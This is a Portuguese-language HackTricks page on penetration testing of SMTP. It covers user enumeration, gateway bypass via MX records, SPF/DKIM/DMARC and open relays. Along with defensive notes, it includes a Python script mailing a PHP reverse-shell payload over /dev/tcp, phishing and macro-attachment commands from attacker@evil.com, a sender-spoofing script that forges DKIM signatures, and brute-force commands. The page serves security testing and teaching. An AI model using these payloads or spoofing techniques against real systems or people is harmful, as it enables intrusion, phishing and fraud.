# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}


## **Informações Básicas**

O **Simple Mail Transfer Protocol (SMTP)** é um protocolo utilizado na suíte TCP/IP para o **envio e recebimento de e-mails**. Devido às suas limitações em enfileirar mensagens no lado do destinatário, o SMTP costuma ser usado juntamente com **POP3 ou IMAP**. Esses protocolos adicionais permitem que os usuários armazenem mensagens em uma caixa postal no servidor e as baixem periodicamente.

Na prática, é comum que **programas de e-mail** utilizem **SMTP para enviar e-mails**, enquanto usam **POP3 ou IMAP para recebê-los**. Em sistemas baseados em Unix, **sendmail** destaca-se como o servidor SMTP mais frequentemente utilizado para fins de e-mail. O pacote comercial conhecido como Sendmail inclui um servidor POP3. Além disso, **Microsoft Exchange** fornece um servidor SMTP e oferece a opção de incluir suporte a POP3.

**Porta padrão:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
## Gateways de Segurança de Email (SEGs)

Como mencionado neste [blog post](https://21ad.netlify.app/blogs/the-silent-inbox-how-verified-emails-slip-past-email-security-gateways/) **Gateways de Segurança de Email (SEGs)** ficam **em-line** com o fluxo de e-mail de entrada ao **alterar registros MX** para apontar para o SEG em vez do servidor de e-mail. O SEG inspeciona o e-mail de entrada (por exemplo, reputação de IP, blocklists, checagens SPF, detecção de spoofing, análise de metadados/conteúdo, sandboxing, reescrita de URLs) e então encaminha, descarta ou coloca em quarentena mensagens com base na política. O modelo de segurança assume que **todo o e-mail de entrada chega ao SEG primeiro**; se o servidor de e-mail puder ser alcançado diretamente, o SEG pode ser **evitado** (similar a pular um WAF falando diretamente com a origem).

### Evitando SEGs via incompatibilidade de MX

Organizações que usam Entra ID / Exchange Online frequentemente têm **múltiplos domínios aceitos**. Se **qualquer domínio aceito** tiver um registro MX que **aponte diretamente para o servidor de e-mail** (por exemplo, Exchange Online) em vez do SEG, você pode entregar e-mail para esse domínio e **evitar o SEG**. Isso é uma **má configuração** (não uma vulnerabilidade), mas ainda uma lacuna comum.

Também note o domínio padrão `<tenant>.onmicrosoft.com`: seu registro MX sempre aponta para Exchange Online. Se o inbound para `*.onmicrosoft.com` **não estiver bloqueado**, enviar para `user@<tenant>.onmicrosoft.com` pode ir direto para a caixa de entrada enquanto contorna o SEG.

**Notas defensivas**:

- Bloquear o tráfego de entrada para `*.onmicrosoft.com`.
- Auditar regularmente os domínios aceitos e seu roteamento MX.
- Configurar os servidores de e-mail para **aceitar apenas** tráfego de entrada do SEG.

### Cabeçalhos EMAIL

Se você tiver a oportunidade de **fazer a vítima te enviar um email** (por exemplo via formulário de contato da página), faça, porque **você pode aprender sobre a topologia interna** da vítima ao ver os cabeçalhos do e-mail.

Você também pode obter um e-mail de um servidor SMTP ao tentar **enviar para esse servidor um e-mail para um endereço inexistente** (porque o servidor enviará ao atacante um NDN). Mas, certifique-se de que você envia o e-mail de um endereço permitido (verifique a política SPF) e de que você pode receber mensagens NDN.

Você também deve tentar **enviar conteúdos diferentes porque você pode encontrar informações mais interessantes** nos cabeçalhos, como: `X-Virus-Scanned: by av.domain.com`\
Você deve enviar o arquivo de teste EICAR.\
Detectar o **AV** pode permitir que você explore **vulnerabilidades conhecidas.**

## Ações básicas

### **Banner Grabbing/Conexão básica**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### Encontrando servidores MX de uma organização
```bash
dig +short mx google.com
```
### Enumeração
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - Divulgação de informações

Se o servidor suportar NTLM auth (Windows), você pode obter informações sensíveis (versões). More info [**here**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
Ou **automatize** isto com o plugin **nmap** `smtp-ntlm-info.nse`

### Nome interno do servidor - Divulgação de informação

Alguns servidores SMTP completam automaticamente o endereço do remetente quando o comando "MAIL FROM" é emitido sem um endereço completo, revelando seu nome interno:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

Verifique se você sniffou alguma senha nos pacotes para a porta 25

### [Auth bruteforce](../../generic-hacking/brute-force.md#smtp)

## Username Bruteforce Enumeration

**Autenticação nem sempre é necessária**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### Ferramentas automáticas
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
## Relatórios DSN

**Delivery Status Notification Reports**: Se você enviar um **email** para uma organização para um **endereço inválido**, a organização notificará que o endereço era inválido enviando um **mail de volta para você**. Os **Headers** do email retornado irão **conter** possíveis **informações sensíveis** (como IP address dos mail services que interagiram com os reports ou informações de anti-virus software).

## [Commands](smtp-commands.md)

### Enviando um Email a partir do console linux
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
Ao anexar arquivos com `swaks`, utilize o prefixo `@` para que os bytes do arquivo sejam incorporados em vez da string literal do nome do arquivo. Isso é crítico para entregar documentos com macros:
```bash
swaks --to hr@example.local --from attacker@evil.com --header "Subject: Resume" --body "Please review" --attach @resume.doc --server 10.0.0.5
```
### Enviando um e-mail com Python

<details>

<summary>Código Python aqui</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP Smuggling

A vulnerabilidade SMTP Smuggling permitiu contornar todas as proteções SMTP (veja a próxima seção para mais informações sobre as proteções). Para mais informações sobre SMTP Smuggling ver:


{{#ref}}
smtp-smuggling.md
{{#endref}}

## Mail Spoofing Countermeasures

As organizações são impedidas de ter emails não autorizados enviados em seu nome ao empregar **SPF**, **DKIM** e **DMARC**, devido à facilidade de spoofing de mensagens SMTP.

Um **guia completo sobre essas contramedidas** está disponível em [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/).

### SPF

> [!CAUTION]
> SPF [was "deprecated" in 2014](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). Isso significa que, em vez de criar um **TXT record** em `_spf.domain.com`, você o cria em `domain.com` usando a **mesma sintaxe**.\
> Além disso, para reutilizar registros spf anteriores é bem comum encontrar algo como `"v=spf1 include:_spf.google.com ~all"`

**Sender Policy Framework** (SPF) é um mecanismo que permite aos Mail Transfer Agents (MTAs) verificar se um host que envia um email está autorizado, consultando uma lista de servidores de email autorizados definida pelas organizações. Essa lista, que especifica endereços/ranges IP, domínios e outras entidades **autorizadas a enviar email em nome de um nome de domínio**, inclui vários "**Mechanisms**" no registro SPF.

#### Mechanisms

From [Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework):

| Mechanism | Description                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | Matches always; usado para um resultado padrão como `-all` para todos os IPs não correspondidos por mecanismos anteriores.                                                                                                                                                                                                          |
| A         | Se o nome de domínio tiver um registro de endereço (A ou AAAA) que possa ser resolvido para o endereço do remetente, corresponderá.                                                                                                                                                                                                 |
| IP4       | Se o remetente estiver em um dado intervalo de endereços IPv4, corresponde.                                                                                                                                                                                                                                                           |
| IP6       | Se o remetente estiver em um dado intervalo de endereços IPv6, corresponde.                                                                                                                                                                                                                                                           |
| MX        | Se o nome de domínio tiver um registro MX que resolva para o endereço do remetente, corresponderá (ou seja, o email vem de um dos servidores de entrada do domínio).                                                                                                                                                                |
| PTR       | Se o nome de domínio (registro PTR) para o endereço do cliente estiver no domínio indicado e esse nome de domínio resolver para o endereço do cliente (forward-confirmed reverse DNS), corresponderá. Esse mecanismo é desencorajado e deve ser evitado, se possível.                                                               |
| EXISTS    | Se o nome de domínio fornecido resolver para qualquer endereço, corresponderá (não importando o endereço para o qual resolve). Raramente usado. Juntamente com a macro language do SPF oferece correspondências mais complexas, como consultas DNSBL.                                                                               |
| INCLUDE   | Referencia a política de outro domínio. Se a política desse domínio passar, esse mecanismo passa. Contudo, se a política incluída falhar, o processamento continua. Para delegar totalmente à política de outro domínio, a extensão redirect deve ser usada.                                                                        |
| REDIRECT  | <p>Um redirect é um apontador para outro nome de domínio que hospeda uma política SPF; permite que múltiplos domínios compartilhem a mesma política SPF. É útil quando se trabalha com uma grande quantidade de domínios que compartilham a mesma infraestrutura de email.</p><p>A política SPF do domínio indicado no mecanismo redirect será usada.</p> |

Também é possível identificar **Qualifiers** que indicam **o que deve ser feito quando um mechanism corresponder**. Por padrão, o **qualifier "+"** é usado (então se qualquer mechanism corresponder, isso significa que é permitido).\
Normalmente você verá **no final de cada política SPF** algo como: **\~all** ou **-all**. Isso é usado para indicar que **se o remetente não corresponder a nenhuma política SPF, você deve marcar o email como não confiável (\~) ou rejeitá-lo (-).**

#### Qualifiers

Cada mechanism dentro da política pode ser prefixado por um dos quatro qualifiers para definir o resultado pretendido:

- **`+`**: Corresponde a um resultado PASS. Por padrão, os mechanisms assumem esse qualifier, tornando `+mx` equivalente a `mx`.
- **`?`**: Representa NEUTRAL, tratado de forma similar a NONE (nenhuma política específica).
- **`~`**: Denota SOFTFAIL, servindo como um meio-termo entre NEUTRAL e FAIL. Emails que obtêm esse resultado são tipicamente aceitos, mas marcados adequadamente.
- **`-`**: Indica FAIL, sugerindo que o email deve ser rejeitado diretamente.

No exemplo a seguir, é ilustrada a **política SPF do google.com**. Note a inclusão de políticas SPF de diferentes domínios dentro da primeira política SPF:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
Tradicionalmente era possível falsificar qualquer nome de domínio que não tivesse um registro SPF correto/adequado. **Hoje em dia**, se um **e-mail** vier de um **domínio sem um registro SPF válido**, provavelmente será **rejeitado/marcado como não confiável automaticamente**.

To check the SPF of a domain you can use online tools like: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM é utilizado para assinar e-mails de saída, permitindo sua validação por Mail Transfer Agents (MTAs) externos através da recuperação da chave pública do domínio no DNS. Essa chave pública está localizada no registro TXT do domínio. Para acessar essa chave, é necessário conhecer tanto o selector quanto o nome do domínio.

Por exemplo, para solicitar a chave, o nome do domínio e o selector são essenciais. Eles podem ser encontrados no cabeçalho do e-mail `DKIM-Signature`, e.g., `d=gmail.com;s=20120113`.

Um comando para obter essa informação pode ser parecido com:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (Domain-based Message Authentication, Reporting & Conformance)

O DMARC aprimora a segurança de e-mails ao se basear nos protocolos SPF e DKIM. Ele define políticas que orientam os servidores de e-mail sobre o tratamento de mensagens de um domínio específico, incluindo como lidar com falhas de autenticação e para onde enviar relatórios sobre ações de processamento de e-mails.

**Para obter o registro DMARC, você precisa consultar o subdomínio \_dmarc**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC tags

| Tag Name | Propósito                                     | Exemplo                          |
| -------- | --------------------------------------------- | -------------------------------- |
| v        | Versão do protocolo                            | v=DMARC1                         |
| pct      | Percentual de mensagens sujeitas a filtragem   | pct=20                           |
| ruf      | Reporting URI para relatórios forenses         | ruf=mailto:authfail@example.com  |
| rua      | Reporting URI de relatórios agregados          | rua=mailto:aggrep@example.com    |
| p        | Política para o domínio organizacional         | p=quarantine                     |
| sp       | Política para subdomínios do domínio organizacional | sp=reject                    |
| adkim    | Modo de alinhamento para DKIM                  | adkim=s                          |
| aspf     | Modo de alinhamento para SPF                   | aspf=r                           |

### **E quanto aos Subdomínios?**

**De** [**here**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
You need to have separate SPF records for each subdomain you wish to send mail from.\
The following was originally posted on openspf.org, which used to be a great resource for this kind of thing.

> The Demon Question: What about subdomains?
>
> If I get mail from pielovers.demon.co.uk, and there's no SPF data for pielovers, should I go back one level and test SPF for demon.co.uk? No. Each subdomain at Demon is a different customer, and each customer might have their own policy. It wouldn't make sense for Demon's policy to apply to all its customers by default; if Demon wants to do that, it can set up SPF records for each subdomain.
>
> So the advice to SPF publishers is this: you should add an SPF record for each subdomain or hostname that has an A or MX record.
>
> Sites with wildcard A or MX records should also have a wildcard SPF record, of the form: \* IN TXT "v=spf1 -all"

Isso faz sentido — um subdomínio pode muito bem estar em uma localização geográfica diferente e ter uma definição SPF bastante distinta.

### **Open Relay**

When emails are sent, ensuring they don't get flagged as spam is crucial. This is often achieved through the use of a **relay server that is trusted by the recipient**. However, a common challenge is that administrators might not be fully aware of which **IP ranges are safe to allow**. This lack of understanding can lead to mistakes in setting up the SMTP server, a risk frequently identified in security assessments.

A workaround that some administrators use to avoid email delivery issues, especially concerning communications with potential or ongoing clients, is to **allow connections from any IP address**. This is done by configuring the SMTP server's `mynetworks` parameter to accept all IP addresses, as shown below:
```bash
mynetworks = 0.0.0.0/0
```
Para verificar se um servidor de e-mail é um open relay (ou seja, se pode encaminhar e-mails de qualquer origem externa), a ferramenta `nmap` é comumente usada. Ela inclui um script específico projetado para testar isso. O comando para realizar uma varredura verbosa em um servidor (por exemplo, com IP 10.10.10.10) na porta 25 usando `nmap` é:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **Ferramentas**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **Verificar misconfigurações de SPF e DMARC**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **Obter automaticamente as configurações de SPF e DMARC**

### Enviar Spoof Email

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**Ou você pode usar uma ferramenta:**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> Se você receber algum **erro ao usar a dkim python lib** ao analisar a chave sinta-se à vontade para usar a seguinte.\
> **NOTA**: Isto é apenas uma correção improvisada para fazer verificações rápidas em casos onde, por algum motivo, a openssl private key **não pode ser analisada pelo dkim**.
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```
>
> **Ou você pode fazer isso manualmente:**
>
> {{#tabs}}
> {{#tab name="PHP"}}
>
> <pre class="language-php"><code class="lang-php"><strong># This will send an unsigned message
> </strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
> </strong></code></pre>
>
> {{#endtab}}
>
> {{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **Mais informações**

**Encontre mais informações sobre essas proteções em** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **Outros indicadores de phishing**

- Idade do domínio
- Links apontando para endereços IP
- Técnicas de manipulação de links
- Anexos suspeitos (incomuns)
- Conteúdo do e-mail corrompido
- Valores usados que são diferentes daqueles nos cabeçalhos do e-mail
- Existência de um certificado SSL válido e confiável
- Envio da página para sites de filtragem de conteúdo web

## Exfiltração via SMTP

**Se você puder enviar dados via SMTP** [**read this**](../../generic-hacking/exfiltration.md#smtp)**.**

## Arquivo de configuração

### Postfix

Normalmente, se instalado, `/etc/postfix/master.cf` contém **scripts a executar** quando, por exemplo, um novo e-mail é recebido por um usuário. Por exemplo a linha `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` significa que `/etc/postfix/filtering` será executado se um novo e-mail for recebido pelo usuário mark.

Outros arquivos de configuração:
```
sendmail.cf
submit.cf
```
## Referências

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- <https://21ad.netlify.app/blogs/the-silent-inbox-how-verified-emails-slip-past-email-security-gateways/>

## Comandos Automáticos do HackTricks
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
